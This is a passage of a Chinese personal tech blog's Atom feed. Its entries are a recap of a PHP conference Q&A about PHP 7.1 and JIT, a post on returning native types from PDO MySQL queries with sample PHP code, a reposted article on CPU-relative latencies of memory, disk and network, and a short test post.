title="问答环节"></a>问答环节</h4><p>鸟哥的问答环节也非常精彩，原定一小时的分享最终超了一小时，下面我就凭着记忆对一些问题复现一下，<code>可能存在偏差，将来我可不负责</code></p><p><strong>php7.1那个诡异的函数返回类型限定是如何考虑的？</strong><br>鸟哥：没什么特别考虑，投票投出来的。首先说明一点，我投的是反对票。包括php的命名空间反斜杠我也是非常反对的，但可能由于我并没有对这方面太深的认识，没有理解其他开发者的意图。不过这些问题用习惯了也不是什么大的问题</p><p><strong>升级php7后，遇到了一个诡异的引用计数的问题。具体记不清了，大致是他们发现有个应该回收的变量在升级后没有回收</strong><br>鸟哥：我现在不能给你准确答复，有可能是个bug，这个我随后跟进一下。但我想说的是你刚才介绍了你们在调试过程中对引用数的反复推算，其实不必纠结这，引用数用于垃圾回收时只有0和非0两种区别，我们在增加引用计数时可能有时候不是加1，而是加2，所以不要太在意具体是多少，确定大于0就行</p><p><strong>一位学生提问者表示自己对高并发、分布式感兴趣，如何提升这方面的技能呢？</strong><br>鸟哥：这里你有一个误区。我们研究学习技术并不是为了学习而学习，而是为了解决实际的业务问题。你没有接触过这方面的业务，自然没有这方面的经验，等你真正有这个业务需求时，好多东西原理都很简单，使用方法也很成熟，自然就会了，这是个水到渠成的过程，不必刻意去追求那个“术”。另外，我多说一句是，其实当你真正处在这样的业务中时，你会发现这些事情很少需要你操心的，OP通过各种集群就已经把这些问题给屏蔽了。</p><p><strong>鸟哥你是怎样看待php的前景呢？现在黑php的这么多人</strong><br>鸟哥：php的前景不要问我，要问你和我，整个php生态。天峰贡献一个swoole，php就有了高性能网络请求功能，xx贡献个php-ml，php就有了大数据处理功能，我今天贡献一个jit，php就有了动态编译能力。php发展到今天就是大家你一个小贡献，他一个小贡献积累出来的，所以php的前景好不好，要看我们生态，也希望大家踊跃贡献。至于黑php，我现在都懒得反驳了，有句话说的好，“黑php之前，先数数他给你挣了多少钱”，我一直认为业务是技术存在的理由，能不能快速响应需求、实现业务才是最根本的。</p><p><strong>目前php没有连接池，非常不方便，不知道官方是否有支持计划？</strong><br>鸟哥：目前没有。不过这不正是一个给社区做贡献的机会吗？你们开发一个连接池，贡献到社区既方便了自己，也方便了大家。天峰昨天的分享PHP-X，不就是为了这样的事</p><p><strong>鸟哥你是怎样看待全栈工程师这个概念的？</strong><br>鸟哥：我并不认同这个概念，我认为这是个伪命题。全栈这个概念最早是前端工程师提出来的，认为从前端到后端这是“全栈”，但我理解的全栈应该是对一个领域从底层原理到上层应用，这不才更应该叫做栈？自称全栈工程师的大部分属于只对各个领域多少有些认识而已。优秀的工程师不必刻意去追求全栈，你只需要在你的领域里不断深入就行，深度达到了，自然就有了广度，<code>广度是深度的副产品</code>，推而广之，就是所谓的全栈工程师是当你在一个领域深入到一定阶段后的副产品，而不是刻意在各个领域学出来的</p><p><strong>php7对性能压榨已经比较彻底了，未来php是继续提高性能呢，还是增加新的特性？</strong><br>鸟哥：你想太多了，目前并未任何打算。JIT开发就非常困难了，这个是否能够成功还是未知数，下次大会如果JIT没有完成，我就没啥可分享的了。</p><p><strong>现在在北京很难安家，将来回到二三线城市，php很难找工作，不知道鸟哥有什么看法吗？</strong><br>鸟哥：不必过于担心，不光是程序猿，其实还有好多公司也很难承受一线城市的成本，也在不断的往二三城市分流，所以找工作问题还是不大的。另外至于你担心php难找工作，那你可以换java、换go啊，一个程序猿不应该给自己打上标签，“xx程序猿”，你作为一个工程师，至少要精通3种以上的语言，而且要有良好的学习能力</p><p><strong>鸟哥你是如何放松你的部下呢？会请他们去大保健吗？</strong><br>鸟哥：这个我没太多经验，不过就我自己来说，有时候加班多了还是比较累的，我有段时间脖子特别疼，一周得去至少三次按摩院按摩才能缓解，当然我说的是盲人按摩。后来我真的研究了颈椎康复指南，不是开玩笑，我是真研究了。人的脑袋大概12斤重，你想你整天顶个西瓜，要是颈椎肌肉不行的话，能不难受吗？所以我后来经常去健身房，锻炼颈椎，后来才慢慢好了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸟哥本次分享的主要内容是，在php7发布的这两年期间他们的主要工作，包括release的7.1和正在开发中的jit分支。说实话，由于本人水平有限，鸟哥分享的内容只能大概听懂意思，知道他们在做什么，但具体原理细节，鸟哥分享的我还真听不懂。这里就对鸟哥的分享内容做个总结。&lt;/p&gt;
&lt;h4 id=&quot;php7之后还有什么？JIT&quot;&gt;&lt;a href=&quot;#php7之后还有什么？JIT&quot; class=&quot;headerlink&quot; title=&quot;php7之后还有什么？JIT&quot;&gt;&lt;/a&gt;php7之后还有什么？JIT&lt;/h4&gt;&lt;p&gt;php7于15年正式发布，他的最大卖点是，无感知的100%性能提升，包含了运行速度与内存消耗。那么在此之后php该往哪里发展呢？目前已经在开发的一个大方向就是JIT&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JIT是什么？为什么是JIT？&lt;/strong&gt;&lt;br&gt;鸟哥并没有做过多的解释。我就谈一些我的肤浅认识，给phper们提供些参考。&lt;/p&gt;
&lt;p&gt;首先JIT（just in time）并非是新技术，一大批语言如java早已实现。JIT的思想很简单，即在程序运行时动态对程序进行编译，生成平台相关的机器码，从而加快程序运行速度。&lt;/p&gt;
&lt;p&gt;php文件的执行流程大致是首先引擎加载php文件，解释器逐条解释执行代码。引入JIT后，前面一样，重点是JIT编译器会根据Runtime信息对热点代码进行动态编译生成机器码，然后这部分代码以后就可以直接执行了，而不需要解释器逐条解释执行了，运行效率便得到了提升&lt;/p&gt;
&lt;p&gt;&lt;code&gt;看到这里不知道大家是否和我有一样的疑问，既然编译为机器码执行的效率那么高，为何不在项目正式部署前全部进行编译，何必在运行时编译？&lt;/code&gt;要知道运行时编译也会增加程序的执行时间的。我在查阅了一些资料和一番思考后，有以下一些浅见&lt;/p&gt;
&lt;p&gt;代码发布前先编译，是比JIT更早的通用办法，称为&lt;code&gt;AOT（ahead of time）&lt;/code&gt;，c语言便是这种执行模式。关于这两种模式孰优孰劣，学术界一直争论不休，目前也没有定论。但JIT相比AOT有这样几个优点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;发布速度快&lt;/strong&gt;。不用每次都编译，发布速度自然快&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优化效率更好&lt;/strong&gt;。因为JIT是基于Runtime信息，比AOT更“了解”代码，优化的效率更好。比如分析Runtime得知某个变量虽然声明是10个字节，但运行过程中一直是1个字节，那么就可以减小程序内存消耗；再比如某段代码始终未被执行，JIT则可以直接将其忽略&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;粒度更精细&lt;/strong&gt;。JIT可以只针对hotspot（热点）进行编译，热点可能是一个函数或者只是一个代码段&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对码农透明&lt;/strong&gt;。JIT无须码农自己对程序根据不同平台进行编译发布，只需要写高级代码即可&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于以上几个优点，再结合php一贯的简单易用原则，我想JIT确实是不错的选择。不过php也是支持AOT的，有兴趣的同学可以查一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>如何在PDO查询中返回强类型</title>
    <link href="http://www.twosee.cn/2017/12/30/how-to-use-strong-type-in-pdo/"/>
    <id>http://www.twosee.cn/2017/12/30/how-to-use-strong-type-in-pdo/</id>
    <published>2017-12-30T05:11:36.000Z</published>
    <updated>2018-05-12T03:19:35.451Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE ），或试着使用本地预处理语句（如果为 FALSE）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。 需要 bool 类型。</p></blockquote><p>PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。</p><p>这是之前我说的默认总是模拟prepare,因为低版本MYSQL驱动不支持prepare.<br>数据类型问题,在旧版本的MySQL中还真是不能解决的。它直接返回字符串给外部系统。稍微新一点的MySQL和客户端驱动可以直接内部的本地类型而不再进行内部转换为字符串了。有了这个基础，就有解决的可能了。</p><h4 id="Test-code"><a href="#Test-code" class="headerlink" title="Test-code"></a>Test-code</h4><p>此处用query测试证明,prepare_excute二连也是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> \PDO(<span class="string">'mysql:dbname='</span>.$options[<span class="string">'database'</span>].<span class="string">';host='</span>.$options[<span class="string">'host'</span>], $options[<span class="string">'user'</span>], $options[<span class="string">'password'</span>]);</span><br><span class="line">$db-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, <span class="keyword">false</span>);<span class="comment">//关闭预处理语句模拟</span></span><br><span class="line">$r = ($db-&gt;query(<span class="string">'SELECT * FROM test WHERE `id`=1 LIMIT 1'</span>, \PDO::FETCH_ASSOC))-&gt;fetch();</span><br><span class="line">var_dump($r);</span><br></pre></td></tr></table></figure><h4 id="result"><a href="#result" class="headerlink" title="$result"></a>$result</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  int(<span class="number">1</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">64</span>) <span class="string">"1dfd47ed5fb0183d05157f21cab0fd8c151379f407a173190445bbd82aa5aeaa"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外,PDO为参数绑定也提供了强类型的设定,默认传给Mysql的是string,常用的类型如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$data_types = [</span><br><span class="line">  <span class="string">'NULL'</span>    =&gt; PDO::PARAM_NULL,</span><br><span class="line">  <span class="string">'boolean'</span> =&gt; PDO::PARAM_BOOL,</span><br><span class="line">  <span class="string">'integer'</span> =&gt; PDO::PARAM_INT,</span><br><span class="line">  <span class="string">'string'</span>  =&gt; PDO::PARAM_STR,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">$this</span>-&gt;sm-&gt;bindParam(<span class="string">':id'</span>, $id, $data_types[getType($id)]);</span><br></pre></td></tr></table></figure><blockquote><p>data<em>type: 使用[*PDO :: PARAM</em> ** 常量](<a href="http://php.net/manual/en/pdo.constants.php)来设定参数的显式数据类型。要从存储过程返回INOUT参数，请使用按位或运算符来设置`data_type`参数的PDO" target="_blank" rel="noopener">http://php.net/manual/en/pdo.constants.php)来设定参数的显式数据类型。要从存储过程返回INOUT参数，请使用按位或运算符来设置`data_type`参数的PDO</a> :: PARAM_INPUT_OUTPUT位。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt; 有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE ），或试着使用本地预处理语句（如果为 FALSE）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。 需要 bool 类型。&lt;/p&gt;

      
    
    </summary>
    
      <category term="php" scheme="http://www.twosee.cn/categories/php/"/>
    
      <category term="mysql" scheme="http://www.twosee.cn/categories/php/mysql/"/>
    
    
      <category term="pdo" scheme="http://www.twosee.cn/tags/pdo/"/>
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>[转] 让 CPU 告诉你硬盘和网络到底有多慢</title>
    <link href="http://www.twosee.cn/2017/12/28/how-slow-is-disk-and-network/"/>
    <id>http://www.twosee.cn/2017/12/28/how-slow-is-disk-and-network/</id>
    <published>2017-12-28T08:18:03.000Z</published>
    <updated>2018-04-05T08:44:15.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自 <a href="http://cizixs.com/2017/01/03/how-slow-is-disk-and-network" target="_blank" rel="noopener">cizixs</a></p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>经常听到有人说磁盘很慢、网络很卡，这都是站在人类的感知维度去表述的，比如拷贝一个文件到硬盘需要几分钟到几十分钟，够我去吃个饭啦；而从网络下载一部电影，有时候需要几个小时，我都可以睡一觉了。</p><p>最为我们熟知的关于计算机不同组件速度差异的图表，是下面这种金字塔形式：越往上速度越快，容量越小，而价格越高。这张图只是给了我们一个直观地感觉，并没有对各个速度和性能做出量化的说明和解释。而实际上，不同层级之间的差异要比这张图大的多。这篇文章就让你站在 CPU 的角度看这个世界，说说到底它们有多慢。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://s7.computerhistory.org/is/image/CHM/500004956?$re-zoomed$" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>希望你看到看完这篇文章能明白两件事情：磁盘和网络真的很慢，性能优化是个复杂的系统性的活。</p><a id="more"></a><p>注：所有的数据都是来自<a href="https://gist.github.com/hellerbarde/2843375" target="_blank" rel="noopener">这个地址</a>。所有的数据会因为机器配置不同，或者硬件的更新而有出入，但是不影响我们直觉的感受。如果对这些数据比较感兴趣，<a href="https://people.eecs.berkeley.edu/~rcs/research/interactive_latency.html" target="_blank" rel="noopener">这个网址</a>给出了不同年份一些指标的数值。</p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><ul><li>先来看看 CPU 的速度，就拿我的电脑来说，主频是 2.6G，也就是说每秒可以执行 <code>2.6*10^9</code>个指令，每个指令只需要 <code>0.38ns</code>（现在很多个人计算机的主频要比这个高，配置比较高的能达到 3.0G+）。我们把这个时间当做基本单位 <code>1s</code>，因为 <code>1s</code> 大概是人类能感知的最小时间单位。</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://photocdn.sohu.com/20141022/Img405364158.jpg" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><ul><li>一级缓存读取时间为 <code>0.5ns</code>，换算成人类时间大约是 <code>1.3s</code>，大约一次或者两次心跳的时间。这里能看出缓存的重要性，因为它的速度可以赶上 CPU，程序本身的 locality 特性加上指令层级上的优化，cache 访问的命中率很高，这最终能极大提高效率。</li><li>分支预测错误需要耗时 <code>5ns</code>，换算成人类时间大约是 <code>13s</code>，这个就有点久了，所以你会看到很多文章分析如何优化代码来降低分支预测的几率，比如<a href="http://stackoverflow.com/questions/11227809/why-is-it-faster-to-process-a-sorted-array-than-an-unsorted-array" target="_blank" rel="noopener">这个得分非常高的 stackoverflow 问题</a>。</li><li>二级缓存时间就比较久了，大约在 <code>7ns</code>，换算成人类时间大约是 <code>18.2s</code>，可以看到的是如果一级缓存没有命中，然后去二级缓存读取数据，时间差了一个数量级。</li></ul><p><strong>小知识：</strong>为什么需要多层的 CPU 缓存呢？<a href="https://fgiesen.wordpress.com/2016/08/07/why-do-cpus-have-multiple-cache-levels/" target="_blank" rel="noopener">这篇文章通过一个通俗易懂的例子给出了讲解</a>。</p><ul><li>我们继续，互斥锁的加锁和解锁时间需要 <code>25ns</code>，换算成人类时间大约是 <code>65s</code>，首次达到了一分钟。并发编程中，我们经常听说锁是一个很耗时的东西，因为在微波炉里加热一个东西需要一分钟的话，你要在那傻傻地等蛮久了。</li><li>然后就到了内存，每次内存寻址需要 <code>100ns</code>，换算成人类时间是 <code>260s</code>，也就是<code>4分多钟</code>，如果读一些不需要太多思考的文章，这么久能读完2-3千字（这个快阅读的时代，很少人在手机上能静心多这么字了）。看起来还不算坏，不多要从内存中读取一段数据需要的时间会更多。到了内存之后，时间就变了一个量级，CPU 和内存之间的速度瓶颈被称为<a href="https://en.wikipedia.org/wiki/Von_Neumann_architecture#Von_Neumann_bottleneck" target="_blank" rel="noopener">冯诺依曼瓶颈</a>。</li><li>一次 CPU 上下文切换（系统调用）需要大约 <code>1500ns</code>，也就是 <code>1.5us</code>（这个数字参考了<a href="http://blog.tsunanet.net/2010/11/how-long-does-it-take-to-make-context.html" target="_blank" rel="noopener">这篇文章</a>，采用的是单核 CPU 线程平均时间），换算成人类时间大约是 <code>65分钟</code>，嗯，也就是一个小时。我们也知道上下文切换是很耗时的行为，毕竟每次浪费一个小时，也很让人有罪恶感的。上下文切换更恐怖的事情在于，<strong>这段时间里 CPU 没有做任何有用的计算</strong>，只是切换了两个不同进程的寄存器和内存状态；而且这个过程<strong>还破坏了缓存，</strong>让后续的计算更加耗时。</li><li>在 1Gbps 的网络上传输 2K 的数据需要 <code>20us</code>，换算成人类时间是 <code>14.4小时</code>，这么久都能把《星球大战》六部曲看完了（甚至还加上吃饭撒尿的时间）！可以看到网络上非常少数据传输对于 CPU 来说，已经很漫长。而且这里的时间还是理论最大值，实际过程还要更慢一些。</li><li>SSD 随机读取耗时为 <code>150us</code>，换算成人类时间大约是 <code>4.5天</code>。换句话说，SSD 读点数据，CPU 都能休假，报团参加周边游了。虽然我们知道 SSD 要比机械硬盘快很多，但是这个速度对于 CPU 来说也是像乌龟一样。<code>I/O 设备</code> 从硬盘开始速度开始变得漫长，这个时候我们就想起内存的好处了。尽量减少 IO 设备的读写，把最常用的数据放到内存中作为缓存是所有程序的通识。像 <code>memcached</code> 和 <code>redis</code> 这样的高速缓存系统近几年的异军突起，就是解决了这里的问题。</li><li>从内存中读取 <code>1MB</code> 的连续数据，耗时大约为 <code>250us</code>，换算成人类时间是 <code>7.5天</code>，这次假期升级到国庆七天国外游了。</li><li>同一个数据中心网络上跑一个来回需要 <code>0.5ms</code>，换算成人类时间大约是 <code>15天</code>，也就是半个月的时间。如果你的程序有段代码需要和数据中心的其他服务器交互，在这段时间里 CPU 都已经狂做了半个月的运算。减少不同服务组件的网络请求，是性能优化的一大课题。</li><li>从 SSD 读取 1MB 的顺序数据，大约需要 <code>1ms</code>，换算成人类时间是 <code>1个月</code>。也就是说 SSD 读一个普通的文件，如果要等你做完，CPU 一个月时间就荒废了。尽管如此，<strong>SSD</strong> 已经很快啦，不信你看下面机械磁盘的表现。</li><li>磁盘寻址时间为 <code>10ms</code>，换算成人类时间是 <code>10个月</code>，刚好够人类创造一个新的生命了。如果 CPU 需要让磁盘泡杯咖啡，在它眼里，磁盘去生了个孩子，回来告诉它你让我泡的咖啡好了。机械硬盘使用 <code>RPM(Revolutions Per Minute/每分钟转速)</code> 来评估磁盘的性能：RPM 越大，平均寻址时间更短，磁盘性能越好。寻址只是把磁头移动到正确的磁道上，然后才能读取指定扇区的内容。换句话说，寻址虽然很浪费时间，但其实它并没有办任何的正事（读取磁盘内容）。</li><li>从磁盘读取 1MB 连续数据需要 <code>20ms</code>，换算成人类时间是 <code>20个月</code>。<strong>IO 设备是计算机系统的瓶颈</strong>，希望读到这里你能更深切地理解这句话！如果还不理解，不妨想想你在网上买的东西，快递送了将近两年，你的心情是怎么样的。</li><li>而从世界上不同城市网络上走一个来回，平均需要 <code>150ms</code>（参考<a href="https://wondernetwork.com/pings/" target="_blank" rel="noopener">世界各地 ping 报文的时间</a>），换算成人类时间是 <code>12.5年</code>。不难理解，所有的程序和架构都会尽量避免不同城市甚至是跨国家的网络访问，<a href="https://en.wikipedia.org/wiki/Content_delivery_network" target="_blank" rel="noopener">CDN</a> 就是这个问题的一个解决方案：让用户和最接近自己的服务器交互，从而减少网络上报文的传输时间。</li><li>虚拟机重启一次大约要 <code>4s</code> 时间，换算成人类的时间是 <code>3百多年</code>。对于此，我想到了乔布斯要死命<a href="http://stevejobsdailyquote.com/2014/03/26/boot-time/" target="_blank" rel="noopener">优化 Mac 系统开机启动时间</a>的故事。如果机器能少重启而且每次启动能快一点，不仅能救人命，也能救 CPU 的命。</li><li>物理服务器重启一次需要 <code>5min</code>，换算成人类时间是 <code>2万5千年</code>，快赶上人类的文明史了。5 分钟人类都要等一会了，更别提 CPU 了，所以没事不要乱重启服务器啊，分分钟终结一个文明的节奏。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.akkadia.org/drepper/cpumemory.pdf" target="_blank" rel="noopener">What Every Programmer Should Know About Memory</a></li><li><a href="http://duartes.org/gustavo/blog/post/getting-physical-with-memory/" target="_blank" rel="noopener">Getting Physical With Memory</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文转载自 &lt;a href=&quot;http://cizixs.com/2017/01/03/how-slow-is-disk-and-network&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cizixs&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;经常听到有人说磁盘很慢、网络很卡，这都是站在人类的感知维度去表述的，比如拷贝一个文件到硬盘需要几分钟到几十分钟，够我去吃个饭啦；而从网络下载一部电影，有时候需要几个小时，我都可以睡一觉了。&lt;/p&gt;
&lt;p&gt;最为我们熟知的关于计算机不同组件速度差异的图表，是下面这种金字塔形式：越往上速度越快，容量越小，而价格越高。这张图只是给了我们一个直观地感觉，并没有对各个速度和性能做出量化的说明和解释。而实际上，不同层级之间的差异要比这张图大的多。这篇文章就让你站在 CPU 的角度看这个世界，说说到底它们有多慢。&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;http://s7.computerhistory.org/is/image/CHM/500004956?$re-zoomed$&quot; alt=&quot;img&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;img&lt;/div&gt;
            &lt;/figure&gt;
&lt;p&gt;希望你看到看完这篇文章能明白两件事情：磁盘和网络真的很慢，性能优化是个复杂的系统性的活。&lt;/p&gt;
    
    </summary>
    
      <category term="编程原理" scheme="http://www.twosee.cn/categories/%E7%BC%96%E7%A8%8B%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="cpu" scheme="http://www.twosee.cn/tags/cpu/"/>
    
      <category term="memory" scheme="http://www.twosee.cn/tags/memory/"/>
    
      <category term="disk" scheme="http://www.twosee.cn/tags/disk/"/>
    
      <category term="network" scheme="http://www.twosee.cn/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>woo</title>
    <link href="http://www.twosee.cn/2017/12/28/test/"/>
    <id>http://www.twosee.cn/2017/12/28/test/</id>
    <published>2017-12-28T02:40:00.000Z</published>
    <updated>2017-12-28T02:51:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="｡･∀･-ﾉﾞ"><a href="#｡･∀･-ﾉﾞ" class="headerlink" title="(｡･∀･)ﾉﾞ"></a>(｡･∀･)ﾉﾞ</h1><h2 id="👁SEE-IS-THE-🐳SEA-OF-CC😎"><a href="#👁SEE-IS-THE-🐳SEA-OF-CC😎" class="headerlink" title="👁SEE IS THE 🐳SEA OF CC😎"></a>👁SEE IS THE 🐳SEA OF CC😎</h2><p>My name is cc,</p><p>so I’m <strong>Twosee</strong>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;｡･∀･-ﾉﾞ&quot;&gt;&lt;a href=&quot;#｡･∀･-ﾉﾞ&quot; class=&quot;headerlink&quot; title=&quot;(｡･∀･)ﾉﾞ&quot;&gt;&lt;/a&gt;(｡･∀･)ﾉﾞ&lt;/h1&gt;&lt;h2 id=&quot;👁SEE-IS-THE-🐳SEA-OF-CC😎&quot;&gt;&lt;a href=&quot;#👁SEE
      
    
    </summary>
    
    
  </entry>
  
</feed>
